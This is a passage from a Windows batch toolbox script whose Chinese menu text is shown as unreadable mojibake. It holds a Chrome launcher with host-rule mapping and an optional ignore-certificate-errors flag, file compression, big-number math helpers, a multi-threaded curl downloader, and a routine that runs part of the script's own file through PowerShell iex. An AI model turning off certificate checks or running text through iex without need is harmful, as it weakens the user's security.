	for /f "eol=# tokens=1,2 delims== " %%a in (!�����ض���!) do (
		set "host-rules=!host-rules!MAP %%a %%b, "
	)
	set "host-rules=--host-rules="!host-rules!""
)
if exist "!�����ؽ���!" (
	for /f "eol=# tokens=1,2 delims== " %%a in (!�����ؽ���!) do (
		set "host-resolver-rules=!host-resolver-rules!MAP %%a %%b, "
	)
	set "host-resolver-rules=--host-resolver-rules="!host-resolver-rules!""
)
if exist "!ǿ��ʹ��quic!" (
	for /f "eol=# tokens=1,2 delims=:" %%a in (!ǿ��ʹ��quic!) do (
		if "%%b" equ "" (
			set "origin-to-force-quic-on=!origin-to-force-quic-on!%%a:443, "
		) else (
			set "origin-to-force-quic-on=!origin-to-force-quic-on!%%a:%%b, "
		)
	)
	set "origin-to-force-quic-on=--enable-quic --origin-to-force-quic-on="!origin-to-force-quic-on!""
)
if "!chrome-command-line!" equ "1" (
	set /p =chrome !host-rules! !host-resolver-rules! !origin-to-force-quic-on! !ignore-certificate-errors!<nul>chrome-command-line
)
start /max "" "!chrome!" --profile-directory=Default --test-type !host-rules! !host-resolver-rules! !origin-to-force-quic-on! !ignore-certificate-errors! %2
if "%1" neq "-chrome" (endlocal&goto memuv2) else (exit 0)
:74
setlocal
title ��һ�����ļ���ѹ��!system!
cls
rem ����ԴĿ¼��Ŀ��Ŀ¼
set source_dir=
set target_dir=
set /p "source_dir=����ԴĿ¼: "
call :ljjc source_dir dir
if "!errorlevel!" equ "0" (
	set /p =��Ч����<nul
	call :out 2
	endlocal
	goto 74
)
set /p "target_dir=����Ŀ��Ŀ¼: "
call :ljjc target_dir dir
if "!errorlevel!" equ "0" (
	set /p =��Ч����<nul
	call :out 2
	endlocal
	goto 74
)
rem ����Ŀ��Ŀ¼�ṹ
for /r "%source_dir%" %%f in (*) do (
	cls
    set "relative_path=%%~pf"
    set "relative_path=!relative_path:%source_dir%=!"
    set "target_path=!target_dir!!relative_path!"
    rem ����Ŀ����Ŀ¼����������ڣ�
    if not exist "!target_path!" (mkdir "!target_path!")
    rem �����ļ���Ŀ��Ŀ¼
	echo;"%%f" �� "!target_path!%%~nxf"
    copy /y /z "%%f" "!target_path!%%~nxf"
    rem ѹ���ļ�
    call :74_2 "!target_path!%%~nxf" %%~zf %%~xf
)
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:74_2
if "%3" equ ".ogg" goto :eof
if "%3" equ ".mpg" goto :eof
if "%3" equ ".gif" goto :eof
if "%3" equ ".zip" goto :eof
if "%3" equ ".rar" goto :eof
if "%3" equ ".7z" goto :eof
if "%3" equ ".png" goto :eof
if "%3" equ ".jpg" goto :eof
if "%3" equ ".jpeg" goto :eof
if "%3" equ ".wmf" goto :eof
if "%3" equ ".wmv" goto :eof
if "%3" equ ".bik" goto :eof
if "%3" equ ".bk2" goto :eof
if "%3" equ ".mp3" goto :eof
if "%3" equ ".acc" goto :eof
if "%3" equ ".m4a" goto :eof
if "%3" equ ".flac" goto :eof
if "%3" equ ".ape" goto :eof
if "%3" equ ".mp4" goto :eof
if "%3" equ ".avi" goto :eof
if "%3" equ ".flv" goto :eof
if "%3" equ ".f4v" goto :eof
if "%3" equ ".mkv" goto :eof
if "%3" equ ".3gp" goto :eof
if "%3" equ ".cab" goto :eof
if "%3" equ ".pdf" goto :eof
if %2 lss 4096 goto :eof
compact /c /exe:lzx %1
goto :eof
:75
setlocal
cls
title ��֤�����Ԫ!system!
set "cho=120"
!hx!
echo;[1]certmgr	[֤�� - ��ǰ�û�]
echo;[2]certlm	[֤�� - ���ؼ����]
echo;[0]���ز˵�
!hx!
!sel!
if "!shuru!" equ "1" (start certmgr.msc&goto memuv2)
if "!shuru!" equ "2" (start certlm.msc&goto memuv2)
if "!shuru!" equ "3" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
endlocal
goto 75
:checkvar
setlocal
if "%1" equ "" (
	goto :eof
) else (
	set "val=!%1!"
)
if "%2" equ "num" (goto checkvar_num)
if "%2" equ "num." (goto checkvar_num.)
if "%2" equ "-num" (goto checkvar_-num)
if "%2" equ "-num." (goto checkvar_-num.)
if "%2" equ "az" (goto checkvar_az)
if "%2" equ "aznum" (goto checkvar_aznum)
goto :eof
:checkvar_num
if defined %1 (
	for /f "delims=0123456789" %%a in ("!%1!") do (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
) else (
	if "%3" neq "" (
		endlocal&set "%3=0"
		goto :eof
	) else (
		echo;0
		goto :eof
	)
)
if "%3" neq "" (
	endlocal&set "%3=1"
	goto :eof
) else (
	echo;1
	goto :eof
)
goto :eof
:checkvar_num.
if defined %1 (
	for /f "delims=.0123456789" %%a in ("!%1!") do (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
) else (
	if "%3" neq "" (
		endlocal&set "%3=0"
		goto :eof
	) else (
		echo;0
		goto :eof
	)
)
for /f "tokens=1,2 delims=." %%a in ("!%1!") do (
	if "%%a" neq "" (
		set "val1=%%a"
	) else (
		set "val1=0"
	)
	if "%%b" neq "" (
		set "val2=%%b"
	) else (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
)
if "!val1!!val2!" neq "" (
	if "%3" neq "" (
		endlocal&set "%3=1"
		goto :eof
	) else (
		echo;1
		goto :eof
	)
) else (
	if "%3" neq "" (
		endlocal&set "%3=0"
		goto :eof
	) else (
		echo;0
		goto :eof
	)
)
goto :eof
:checkvar_-num
if defined %1 (
	for /f "delims=0123456789-" %%a in ("!%1!") do (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
) else (
	if "%3" neq "" (
		endlocal&set "%3=0"
		goto :eof
	) else (
		echo;0
		goto :eof
	)
)
for /f "tokens=1 delims=-" %%a in ("!%1!") do (
	if "!%1:~0,1!" equ "-" (
		if "%3" neq "" (
			endlocal&set "%3=1"
			goto :eof
		) else (
			echo;1
			goto :eof
		)
	) else (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
)
goto :eof
:checkvar_-num.
set "val1=!val:~1!"
set "val2=!val:.=!"
if defined val1 (
	call :checkvar val1 num. jg
	if "!jg!" equ "1" (
		call :checkvar val2 -num jg
		if "!jg!" equ "1" (
			if "%3" neq "" (
				endlocal&set "%3=1"
				goto :eof
			) else (
				echo;1
				goto :eof
			)
		)
	)
)
if "%3" neq "" (
	endlocal&set "%3=0"
	goto :eof
) else (
	echo;0
	goto :eof
)
goto :eof
:checkvar_az
if defined %1 (
	for /f "delims=abcdefghijklmnopqrstuvwxyz" %%a in ("!%1!") do (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
	if "%3" neq "" (
		endlocal&set "%3=1"
		goto :eof
	) else (
		echo;1
		goto :eof
	)
)
goto :eof
:checkvar_aznum
if defined %1 (
	for /f "delims=0123456789abcdefghijklmnopqrstuvwxyz" %%a in ("!%1!") do (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
	if "%3" neq "" (
		endlocal&set "%3=1"
		goto :eof
	) else (
		echo;1
		goto :eof
	)
)
if "%3" neq "" (
	endlocal&set "%3=0"
	goto :eof
) else (
	echo;0
	goto :eof
)
goto :eof
:sqrt
setlocal
set s=%1
set w=%2
if defined W (for /l %%i in (1 1 %W%) do set "s=!s!00") else set W=0
set p=!s!&set /a len=N=0
for %%i in (4096 2048 1024 512 256 128 64 32 16 8 4 2 1) do IF "!p:~%%i!" NEQ "" set/a len+=%%i&set "p=!p:~%%i!"
set /a "N-=~(len%%2)"
set M=!s:~,%N%!
for /l %%i in (1 1 9) do set/a Mx=%%i*%%i&if !Mx! leq !M! set/a "i=%%i,j=100+M-Mx"
set /a "len-=1,Len_i=_N=i/5+1,p=i*20"
set j=!j:~-%_N%!&set p=0!p!&set kl=0000000
set /a _N=8-_N
for /l %%i in (%N% 2 !len!) do (
set "j=!j!!s:~%%i,2!"
if "!j:0=!" neq "" (
set /a Ln_i=Len_i+=2
if "!p!" lss "!j!" (
set d=Z&set in=!kl!!P!&set /a Ln_i+=7
for /l %%j in (9 -1 2) do (
if "!d!" gtr "!j!" (
set "x=%%j"
set d=&set /a "b=x*x"
for /l %%k in (8 8 !Ln_i!) do (
set /a "b=1!in:~-%%k,8!*%%j+b"
set d=!b:~-8!!d!&set /a "b=!b:~,-8!-%%j"
)
set d=!b!!d!
for %%k in (!Len_i!) do set "d=!d:~-%%k!"
)
)
if "!d!" gtr "!j!" (set d=!in!&set x=1&set b=1) else set d=!kl!!d!&set b=0
set j=!kl!!j!&set "t="
for /l %%j in (8 8 !Ln_i!) do (
set /a "b=3!j:~-%%j,8!-1!d:~-%%j,8!-!b:~,1!%%2"
set "t=!b:~1!!t!"
)
for %%j in (!Len_i!) do set "j=!t:~-%%j!"
set "j=!j:~1!") else set "x=0"
set /a "Len_i-=1"
if "!x!" neq "0" (
if "!x!" geq "5" (
set p=&set b=0&set "in=!kl!!i!!x!"
set /a "Ln_i=Len_i+_N"
for /l %%j in (8 8 !Ln_i!) do (
set /a "b=1!in:~-%%j,8!*2+!b:~,1!%%2"
set p=!b:~1!!p!
)
set /a "b=!b:~,1!%%2"
for %%j in (!Len_i!) do set "p=!b:1=01!!p:~-%%j!0"
) else set /a t=x*2&set "p=!p:~,-1!!t!0"
) else set p=!p!0&set "j=!j:~1!"
) else set j=!j:~1!&set p=!p!0&set /a "Len_i+=1,x=0"
set i=!i!!x!
)
for /f "tokens=* delims=." %%i in ("!i:~,-%W%!.!i:~-%W%!") do (endlocal&set %3=%%i)
goto :eof
:10to16
setlocal
set "ran=%1"
:10to16_1
set /a "s=!ran!%%16"
if !s! lss 10 goto 10to16_3
if !s! gtr 12 goto 10to16_2
if "!s!" equ "10" set "s=A"&goto 10to16_3
if "!s!" equ "11" set "s=B"&goto 10to16_3
if "!s!" equ "12" set "s=C"&goto 10to16_3
:10to16_2
if "!s!" equ "13" set "s=D"&goto 10to16_3
if "!s!" equ "14" set "s=E"&goto 10to16_3
if "!s!" equ "15" set "s=F"&goto 10to16_3
:10to16_3
set "jg=!s!!jg!"
set /a "ran/=16"
if !ran! neq 0 goto 10to16_1
if "%2" neq "" (
	endlocal&set "%2=%jg%"
) else (
	endlocal&echo;%jg%
)
goto :eof
:10to2
setlocal
set "num=%1"
:10to2_1
set /a "e=num%%2"
set /a "num/=2"
set "num1=!e!!num1!"
if !num! neq 0 goto 10to2_1
if "%2" neq "" (
	endlocal&set "%2=%num1%"
) else (
	endlocal&echo;%num1%
)
goto :eof
:10to8
setlocal
set "num=%1"
:10to8_2
set /a "b=num%%8"
set /a "num/=8"
set "num1=!b!!num1!"
if !num! neq 0 goto 10to8_2
if "%2" neq "" (
	endlocal&set "%2=%num1%"
) else (
	endlocal&echo;%num1%
)
goto :eof
:2to10
setlocal
set nn=
set "nnn=1"
set "n=%1"
set "n=!n:0= 0!"
set "n=!n:1= 1!"
for %%a in (!n!) do (
	set "nn=%%a !nn!"
)
for %%a in (!nn!) do (
	set /a "num+=%%a*nnn,nnn*=2"
)
if "%2" neq "" (
	endlocal&set "%2=%num%"
) else (
	endlocal&echo;%num%
)
goto :eof
:calc
setlocal
set a=%~1.0
set b=%~3.0
for /f "tokens=1,2 delims=." %%a in ("%a:-=%") do set "a_1=%%a"&set "a_2=%%b"
for /f "tokens=1,2 delims=." %%a in ("%b:-=%") do set "b_1=%%a"&set "b_2=%%b"
call :strlenx %a_1% L1_1
call :strlenx %a_2% L1_2
call :strlenx %b_1% L2_1
call :strlenx %b_2% L2_2
for %%i in (1 2) do (
    set "zero="&set m=0
    if !L1_%%i! leq !L2_%%i! (
        set /a m=L2_%%i-L1_%%i
        if !m! neq 0 (
            for /l %%a in (1 1 !m!) do set zero=!zero!0
		)
        if "%%i" equ "1" (set a_%%i=!zero!!a_%%i!) else set a_%%i=!a_%%i!!zero!
        set Len_%%i=!L2_%%i!
	) else (
        set /a m=L1_%%i-L2_%%i
        for /l %%a in (1 1 !m!) do set zero=!zero!0
        if "%%i" equ "1" (set b_%%i=!zero!!b_%%i!) else set b_%%i=!b_%%i!!zero!
        set Len_%%i=!L1_%%i!
	)
)
set /a Len=Len_1+Len_2+1
if "%~2" equ "+" (
    if "!a:~,1!" neq "-" (
        if "!b:~,1!" neq "-" (
            call :jia %a_1%.%a_2% %b_1%.%b_2% %Len% s
            set "%~4=!s!"
		) else (
            call :jian %a_1%.%a_2% %b_1%.%b_2% %Len% s
            if "%a_1%.%a_2%" gtr "%b_1%.%b_2%" (set "%~4=!s!") else set "%~4=-!s!"
		)
	) else (
        if "!b:~,1!" neq "-" (
            call :jian %a_1%.%a_2% %b_1%.%b_2% %Len% s
            if "%a_1%.%a_2%" gtr "%b_1%.%b_2%" (set "%~4=-!s!") else set "%~4=!s!"
		) else (
            call :jia %a_1%.%a_2% %b_1%.%b_2% %Len% s
            set "%~4=-!s!"
		)
	)
) else (
    if "!a:~,1!" neq "-" (
        if "!b:~,1!" neq "-" (
            call :jian %a_1%.%a_2% %b_1%.%b_2% %Len% s
            if "%a_1%.%a_2%" lss "%b_1%.%b_2%" (set "%~4=-!s!") else set "%~4=!s!"
		) else (
            call :jia %a_1%.%a_2% %b_1%.%b_2% %Len% s
            set "%~4=!s!"
		)
	) else (
        if "!b:~,1!" neq "-" (
            call :jia %a_1%.%a_2% %b_1%.%b_2% %Len% s
            set "%~4=-!s!"
		) else (
            call :jian %a_1%.%a_2% %b_1%.%b_2% %Len% s
            if "%a_1%.%a_2%" lss "%b_1%.%b_2%" (set "%~4=!s!") else set "%~4=-!s!"
		)
	)
)
goto :eof
:strlenx
setlocal
set "$=%1#"
set len=&for %%a in (4096 2048 1024 512 256 128 64 32 16)do if !$:~%%a!. neq . set/a len+=%%a&set $=!$:~%%a!
set $=!$!fedcba9876543210&set/a len+=0x!$:~16,1!
endlocal&set %2=%len%&goto :eof
:jia
setlocal
set a=%~1
set b=%~2
set t=0
set "s="
for /l %%a in (-1 -1 -%~3) do (
    if "!a:~%%a,1!" equ "." (
      set s=.!s!
	) else (
        set /a "c=t+!a:~%%a,1!+!b:~%%a,1!"
        if !c! geq 10 (set t=1) else set t=0
        set s=!c:~-1!!s!
	)
)
if %t% equ 1 (set s=1!s!)
for /f "tokens=1,2 delims=." %%a in ("%s%") do (
    for /f "tokens=1* delims=0" %%c in (".%%b") do if "%%c%%d" equ "." set s=%%a
)
endlocal&set %~4=%s%&goto :eof
:jian
setlocal
if %~1 lss %~2 (
    set a=%~2
    set b=%~1
) else (
    set a=%~1
    set b=%~2
)
set t=0
set "s="
for /l %%a in (-1 -1 -%~3) do (
    if "!a:~%%a,1!" equ "." (
      set s=.!s!
	) else (
        set /a "c=10+!a:~%%a,1!-!b:~%%a,1!-t"
        if !c! lss 10 (set t=1) else set t=0
        set s=!c:~-1!!s!
	)
)
for /f "tokens=1,2 delims=." %%a in ("%s%") do (
    for /f "tokens=* delims=0" %%c in ("%%a") do if "%%c" equ "" (set pre=0) else set pre=%%c
    for /f "tokens=* delims=0" %%c in ("%%b") do if "%%c" equ "" (set s=!pre!) else set s=!pre!.%%b
)
endlocal&set %~4=%s%&goto :eof
:pdxp
if /i "!system!" equ "Microsoft Windows XP Home" (set "system= - Windows XP ��ͥ��"&goto :eof)
if /i "!system!" equ "Microsoft Windows XP Professional" (set "system= - Windows XP רҵ��"&goto :eof)
set "system= - !system:~10!"
goto :eof
:pd7
if /i "!system!" equ "Microsoft Windows 7 Ultimate" (set "system= - Windows 7 �콢��"&goto :eof)
if /i "!system!" equ "Microsoft Windows 7 Home Basic" (set "system= - Windows 7 ��ͥ��ͨ��"&goto :eof)
if /i "!system!" equ "Microsoft Windows 7 Home Premium" (set "system= - Windows 7 ��ͥ�߼���"&goto :eof)
if /i "!system!" equ "Microsoft Windows 7 Professional" (set "system= - Windows 7 רҵ��"&goto :eof)
if /i "!system!" equ "Microsoft Windows 7 Enterprise" (set "system= - Windows 7 ��ҵ��"&goto :eof)
set "system= - !system:~10!"
goto :eof
:pd8
if /i "!system!" equ "Microsoft Windows 8 Pro" (set "system= - Windows 8 רҵ��"&goto :eof)
if /i "!system!" equ "Microsoft Windows 8 China" (set "system= - Windows 8 �й���"&goto :eof)
if /i "!system!" equ "Microsoft Windows 8 Enterprise" (set "system= - Windows 8 ��ҵ��"&goto :eof)
set "system= - !system:~10!"
goto :eof
:pd8.1
if /i "!system!" equ "Microsoft Windows 8.1 Pro" (set "system= - Windows 8.1 רҵ��"&goto :eof)
if /i "!system!" equ "Microsoft Windows 8.1 China" (set "system= - Windows 8.1 �й���"&goto :eof)
if /i "!system!" equ "Microsoft Windows 8.1 Enterprise" (set "system= - Windows 8.1 ��ҵ��"&goto :eof)
set "system= - !system:~10!"
goto :eof
:pd10
if /i "!system!" equ "Microsoft Windows 10 Home" (set "system= - Windows 10 ��ͥ��"&goto :eof)
if /i "!system!" equ "Microsoft Windows 10 Professional" (set "system= - Windows 10 רҵ��"&goto :eof)
if /i "!system!" equ "Microsoft Windows 10 Education" (set "system= - Windows 10 ������"&goto :eof)
if /i "!system!" equ "Microsoft Windows 10 Enterprise" (set "system= - Windows 10 ��ҵ��"&goto :eof)
set "system= - !system:~10!"
goto :eof
:pd11
if /i "!system!" equ "Microsoft Windows 11 Home" (set "system= - Windows 11 ��ͥ��"&goto :eof)
if /i "!system!" equ "Microsoft Windows 11 Professional" (set "system= - Windows 11 רҵ��"&goto :eof)
if /i "!system!" equ "Microsoft Windows 11 Education" (set "system= - Windows 11 ������"&goto :eof)
if /i "!system!" equ "Microsoft Windows 11 Enterprise" (set "system= - Windows 11 ��ҵ��"&goto :eof)
set "system= - !system:~10!"
goto :eof
:sortaz
setlocal
for /f "delims==" %%a in ('set p. 2^>nul')do set "%%a="
for /l %%a in (1 1 20) do set "p.lin=0000000000!p.lin!"
for %%a in (%~1) do (set s=!p.lin!%%a&set "s=!s:~-200!"
if defined p...!s! (set p..%%a=!p..%%a! %%a
set p...!s!=!p..%%a! %%a) else (set p...!s!=%%a))
for /f "tokens=2 delims==" %%a in ('set p...') do (
for %%i in (%%a) do set "p.ok=!p.ok! %%i")
endlocal&set %~2=%p.ok:~1%&goto :EOF
:sortza
setlocal
for /f "delims==" %%a in ('set p. 2^>nul')do set "%%a="
for /l %%a in (1 1 20) do set "p.lin=0000000000!p.lin!"
for %%a in (%~1) do (set s=!p.lin!%%a&set "s=!s:~-200!"
if defined p...!s! (set p..%%a=!p..%%a! %%a
set p...!s!=!p..%%a! %%a) else (set p...!s!=%%a))
for /f "tokens=2 delims==" %%a in ('set p...') do (
for %%i in (%%a) do set "p.ok=%%i !p.ok!")
endlocal&set %~2=%p.ok%&goto :EOF
:checkmem
setlocal
if "%1" equ "" (goto :eof)
if "%2" equ "" (goto :eof)
if "%3" equ "" (goto :eof)
for /f "tokens=2 delims==" %%a in ('"wmic OS get FreePhysicalMemory /Value"') do (
	set "mem=%%a"
	set "mem=!mem:~0,-1!"
	if !mem! %1 %2 (
		endlocal&set "%3=1"
	) else (
		endlocal&set "%3=0"
	)
)
goto :eof
:xcf
setlocal
set "num1=%1"
set "num2=%2"
if "!num1!" equ "" (
	goto :eof
) else (
	for /f "delims=-.0123456789" %%a in ("!num1!") do (
		goto :eof
	)
	for /f "tokens=1,2 delims=." %%a in ("!num1!") do (
		set "num1a=%%a"
		set "num1b=%%b"
	)
)
if "!num1a!" equ "0" (set "num1a=")
:xcf_loop1
if "!num1b:~-1!" equ "0" (
	set "num1b=!num1b:~0,-1!"
	goto xcf_loop1
)
if "!num1b!" equ "" (
	set dot1=0
) else (
	call :strlen num1b dot1
)
if "!num2!" equ "0" (
	goto :eof
) else (
	for /f "delims=-.0123456789" %%a in ("!num2!") do (
		goto :eof
	)
	for /f "tokens=1,2 delims=." %%a in ("!num2!") do (
		set "num2a=%%a"
		set "num2b=%%b"
	)
)
if "!num2a!" equ "0" (set "num2a=")
:xcf_loop2
if "!num2b:~-1!" equ "0" (
	set "num2b=!num2b:~0,-1!"
	goto xcf_loop2
)
if "!num2b!" equ "" (
	set dot2=0
) else (
	call :strlen num2b dot2
)
set /a "dot=dot1+dot2"
set /a "num=!num1a!!num1b!*!num2a!!num2b!"
set "numa=!num:~0,-%dot%!"
set "numb=!num:~-%dot%!"
:xcf_loop
if "!numb:~-1!" equ "0" (
	set "numb=!numb:~0,-1!"
	goto xcf_loop
)
if "!dot!" neq "0" (set "num=!numa!.!numb!")
if "!num:~-1!" equ "." (set "num=!num:~0,-1!")
if "!num:~0,1!" equ "." (set "num=!num:.=0.!")
if "!num:~0,2!" equ "-." (set "num=-0.!num:~2!")
if "%3" neq "" (
	endlocal&set "%3=%num%"
	goto :eof
) else (
	echo;!num!
	goto :eof
)
:scf
setlocal
if "%~1" equ "0" Endlocal&set %~3=0&goto :EOF
if "%~2" equ "0" Endlocal&set %~3=0&goto :EOF
set f=&set jia=&set ji=&set /a n1=0,n2=0
set vard1=&set "vard2="&set var1=%~1&set "var2=%~2"
for /l %%a in (0 1 9) do (
set var1=!var1:%%a= %%a !&set var2=!var2:%%a= %%a !)
for %%a in (!var1!)do (set /a n1+=1&set vard1=%%a !vard1!)
for %%a in (!var2!)do (set /a n2+=1&set vard2=%%a !vard2!)
if !n1! gtr !n2! (set vard1=%vard2%&set vard2=%vard1%)
for %%a in (!vard1!) do (set "t="&set /a j=0
for %%b in (!vard2!) do (if "!jia!" equ "" set /a jia=0
set /a a=%%a*%%b+j+!jia:~-1!&set "t=!a:~-1!!t!"
set a=0!a!&set "j=!a:~-2,1!"&set jia=!jia:~0,-1!)
set "ji=!t:~-1!!ji!"
if "!j:~0,1!" equ "0" (set ss=) else set "ss=!j:~0,1!"
set jia=!ss!!t:~0,-1!)
if not "!j:~0,1!" equ "0" set "t=!j:~0,1!!t!"
set "ji=!t!!ji:~1!"
Endlocal&set %~3=%ji%&goto :EOF
:convertu
setlocal
if "%1" equ "" (goto :eof)
set "tmp=%1"
set "tmp=!tmp:a=A!"
set "tmp=!tmp:b=B!"
set "tmp=!tmp:c=C!"
set "tmp=!tmp:d=D!"
set "tmp=!tmp:e=E!"
set "tmp=!tmp:f=F!"
set "tmp=!tmp:g=G!"
set "tmp=!tmp:h=H!"
set "tmp=!tmp:i=I!"
set "tmp=!tmp:j=J!"
set "tmp=!tmp:k=K!"
set "tmp=!tmp:l=L!"
set "tmp=!tmp:m=M!"
set "tmp=!tmp:n=N!"
set "tmp=!tmp:o=O!"
set "tmp=!tmp:p=P!"
set "tmp=!tmp:q=Q!"
set "tmp=!tmp:r=R!"
set "tmp=!tmp:s=S!"
set "tmp=!tmp:t=T!"
set "tmp=!tmp:u=U!"
set "tmp=!tmp:v=V!"
set "tmp=!tmp:w=W!"
set "tmp=!tmp:x=X!"
set "tmp=!tmp:y=Y!"
set "tmp=!tmp:z=Z!"
if "%2" neq "" (
	endlocal&set "%2=%tmp%"
	goto :eof
) else (
	echo;!tmp!
	goto :eof
)
:convertl
setlocal
if "%1" equ "" (goto :eof)
set "tmp=%1"
set "tmp=!tmp:A=a!"
set "tmp=!tmp:B=b!"
set "tmp=!tmp:C=c!"
set "tmp=!tmp:D=d!"
set "tmp=!tmp:E=e!"
set "tmp=!tmp:F=f!"
set "tmp=!tmp:G=g!"
set "tmp=!tmp:H=h!"
set "tmp=!tmp:I=i!"
set "tmp=!tmp:J=j!"
set "tmp=!tmp:K=k!"
set "tmp=!tmp:L=l!"
set "tmp=!tmp:M=m!"
set "tmp=!tmp:N=n!"
set "tmp=!tmp:O=o!"
set "tmp=!tmp:P=p!"
set "tmp=!tmp:Q=q!"
set "tmp=!tmp:R=r!"
set "tmp=!tmp:S=s!"
set "tmp=!tmp:T=t!"
set "tmp=!tmp:U=u!"
set "tmp=!tmp:V=v!"
set "tmp=!tmp:W=w!"
set "tmp=!tmp:X=x!"
set "tmp=!tmp:Y=y!"
set "tmp=!tmp:Z=z!"
if "%2" neq "" (
	endlocal&set "%2=%tmp%"
	goto :eof
) else (
	echo;!tmp!
	goto :eof
)
:curldxc
setlocal
if not exist "%systemroot%\system32\curl.exe" (
	if not exist .\curl.exe (
		echo;û���ҵ�curl.exe
		goto :eof
	)
)
set "url=%1"
set "tr=%2"
set "filename=%3"
set "dir=%4"
set "par=%5"
set "ua=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
if not defined url (
	echo;���Ӳ���Ϊ��!
	goto :eof
)
if not defined tr (set tr=8)
set tr|findstr "\<[0-9]*\>">nul
if "!errorlevel!" neq "0" (
	echo;�߳���ֻ����������!
	goto :eof
)
if not defined dir (
	for /f "delims=" %%a in ("%0") do (set "dir=%%~dpa")
)
if not exist "!dir!" (
	echo;·�� !dir! ������
	goto :eof
)
dir /ad "!dir!">nul 2>nul||(
	echo;·�� !dir! ����һ���ļ���
	goto :eof
)
if exist "%temp%\tag" (del /f /q "%temp%\tag")
for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
	if "%%a" equ "0x1" (
		for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
			set "proxy=-x %%b"
			echo;ʹ�ô���:	%%b
		)
	) else (
		set proxy=
	)
)
curl !proxy! !doh! !par! -A "!ua!" --compressed -I -# -L -o tag --connect-timeout 5 --output-dir "%temp%" "!url!"
if not exist "%temp%\tag" (
	echo;û�л�ȡ���ļ���Ϣ
	goto :eof
)
for /f "tokens=2 delims= " %%a in ('type %temp%\tag^|findstr /c:"Accept-Ranges:"') do (set "trflag=%%a")
for /f "tokens=2 delims= " %%a in ('type %temp%\tag^|findstr /c:"Content-Length:"') do (set "filesize=%%a")
for /f "tokens=2 delims==" %%a in ('type %temp%\tag^|findstr /c:"filename="') do (set "filename=%%a")
if "!trflag!" neq "bytes" (set tr=1)
if not defined filename (set "filename=%3")
if not defined filesize (goto curldxc_3)
set /a "fd=filesize/tr"
set /a "ys=filesize%%tr"
set oldfd=0
set /a "pdtr=tr-1"
set /a "newfd=fd-1"
set /a "pdfd=fd+ys"
set file=
for /l %%a in (1,1,!tr!) do (set "file=!file!%%a+")
set newtr=
set /a "newtr=tr+1"
set "file=!file:~0,-1!"
if exist "%temp%\down" (rd /s /q "%temp%\down")
md "%temp%\down"
for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
	if "%%a" equ "0x1" (
		for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
			set "proxy=-x %%b"
			echo;ʹ�ô���:	%%b
		)
	) else (
		set proxy=
	)
)
for /l %%a in (1,1,!tr!) do (
	start /b /low "curl���������_!tr!" curl !proxy! !doh! !par! -s -A "!ua!" --compressed -L -C - --retry 2 --retry-delay 1 --connect-timeout 5 -r !oldfd!-!newfd! -o %%a --output-dir "%temp%\down" "!url!"
	set /a "oldfd=newfd+1"
	if "%%a" equ "!pdtr!" (
		set newfd=
	) else (
		set /a "newfd=oldfd+fd-1"
	)
)
pushd "%temp%\down"
:curldxc_2
set ����=
for /l %%a in (1,1,!tr!) do (
	if "%%a" equ "!tr!" (
		if "%%~za" equ "!pdfd!" (
			echo;����%%a���
			set /a "����+=1"
		)
	) else (
		if "%%~za" equ "!fd!" (
			echo;����%%a���
			set /a "����+=1"
		)
	)
)
timeout /t 1 /nobreak>nul
if "!����!" neq "!tr!" (goto curldxc_2)
if "!dir:~-1!" neq "\" (set "dir=!dir!\")
copy /b /z !file! "!dir!!filename!"
popd
rd /s /q "%temp%\down"
del /f /q "%temp%\tag"
goto :eof
:curldxc_3
for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
	if "%%a" equ "0x1" (
		for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
			set "proxy=-x %%b"
			echo;ʹ�ô���:	%%b
		)
	) else (
		set proxy=
	)
)
if "!dir:~-1!" equ "\" (set "dir=!dir:~0,-1!")
curl !proxy! !doh! -A "!ua!" --compressed -# -L -C - --retry 2 --retry-delay 1 --connect-timeout 5 -o "!filename!" --output-dir "!dir!" "!url!"
goto :eof
:pwiex
powershell -mta -nologo -noprofile -command "$command=[IO.File]::ReadAllText('"%weizhi%"') -split '#%1\#.*'; iex ($command[1])"
goto :eof
:out
if exist "!systemroot!\system32\timeout.exe" (
	timeout /t %1 /nobreak>nul
) else (
	ping /n %1 0.0>nul
)
goto :eof
:lj
setlocal
for /f "delims=" %%a in ("!%1!") do (
	set "var=%%~fa"
	if "!var:~-1!" equ "\" (set "var=!var:~0,-1!")
)
endlocal&set "%2=%var%"
goto :eof
:ljjc
setlocal
if "!%1!" equ "" (exit /b 0)
for /f "delims=" %%a in ("!%1!") do (
	set "var=%%~fa"
	if "!var:~-1!" equ "\" (set "var=!var:~0,-1!")
	if not exist "!var!" (exit /b 0)
)
if "%2" equ "dir" (
	if exist "!var!\" (
		endlocal&set "%1=%var%"
		exit /b 1
	) else (
		exit /b 0
	)
) else (
	if exist "!var!\" (
		exit /b 0
	) else (
